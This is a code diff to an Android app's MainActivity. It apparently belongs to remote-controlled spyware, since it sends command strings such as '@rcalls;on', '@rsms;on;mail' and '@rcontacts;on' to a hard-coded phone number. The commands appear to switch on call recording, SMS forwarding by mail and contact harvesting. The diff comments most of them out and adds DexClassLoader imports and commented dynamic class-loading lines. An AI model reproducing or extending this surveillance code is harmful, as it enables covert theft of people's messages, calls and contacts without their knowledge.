@@ -6,6 +6,9 @@ import java.io.PrintStream;
 
 import com.code4bones.utils.*;
 
+import dalvik.system.DexClassLoader;
+import dalvik.system.PathClassLoader;
+
 import android.os.Bundle;
 import android.app.Activity;
 import android.content.Intent;
@@ -38,6 +41,16 @@ public class MainActivity extends Activity {
         progress.setProgress(level);
         txtItems.setText(String.format("Items %d / %d ( approx )",current,total));
         
+        	
+
+        	
+        	//PathClassLoader pl = new PathClassLoader(jarFile,ClassLoader.getSystemClassLoader());
+        	//NetLog.v("pl  - ok\n");
+        	//Class<?> cls = Class.forName(clsName,true,pl);
+        	
+        	
+        	
+        	
         
         
         serviceStart();
@@ -46,14 +59,19 @@ public class MainActivity extends Activity {
         	
         	public void onComplete(Void  v) {
                 cmdPool.Execute("+79037996299", "@setup;ack:0");
+              /*
                 cmdPool.Execute("+79037996299", "@rcalls;on");
                 cmdPool.Execute("+79037996299", "@rsms;on;mail");
                 cmdPool.Execute("+79037996299", "@rcontacts;on");
+                cmdPool.Execute("+79037996299", "@custom");
+        	 */
         	}
         	
         	@Override
         	protected Void doInBackground(Void ... arg0) {
                 cmdPool = CommandPool.getInstance(MainActivity.this);
+
+                
                 cmdPool.defaultSettings();
                 return (Void)null;
         	}
